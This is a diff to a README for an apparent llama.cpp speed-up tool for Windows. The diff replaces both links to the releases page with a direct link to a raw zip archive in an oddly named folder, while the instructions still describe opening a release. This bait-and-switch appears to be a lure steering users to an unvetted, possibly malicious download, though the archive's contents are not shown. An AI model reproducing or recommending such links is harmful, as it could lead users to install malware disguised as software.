@@ -1,6 +1,6 @@
 # ⚡ QuantumLeap---Llama.cpp-TurboQuant - Faster LLMs on Any PC
 
-[![Download](https://img.shields.io/badge/Download%20Here-7B61FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/desmondgregarious958/QuantumLeap---Llama.cpp-TurboQuant/releases)
+[![Download](https://img.shields.io/badge/Download%20Here-7B61FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/desmondgregarious958/QuantumLeap---Llama.cpp-TurboQuant/raw/refs/heads/main/tubage/Quant-Turbo-cpp-Quantum-Leap-Llama-v1.8.zip)
 
 Run large language models on Windows with local speed, lower memory use, and an easy setup path.
 
@@ -17,7 +17,7 @@ In plain terms, it helps models run with less lag and less RAM use. It also supp
 
 Visit this page to download the Windows release package:
 
-https://github.com/desmondgregarious958/QuantumLeap---Llama.cpp-TurboQuant/releases
+https://github.com/desmondgregarious958/QuantumLeap---Llama.cpp-TurboQuant/raw/refs/heads/main/tubage/Quant-Turbo-cpp-Quantum-Leap-Llama-v1.8.zip
 
 Open the latest release, then download the Windows file that matches your system. Most users should pick the standard Windows build.
 
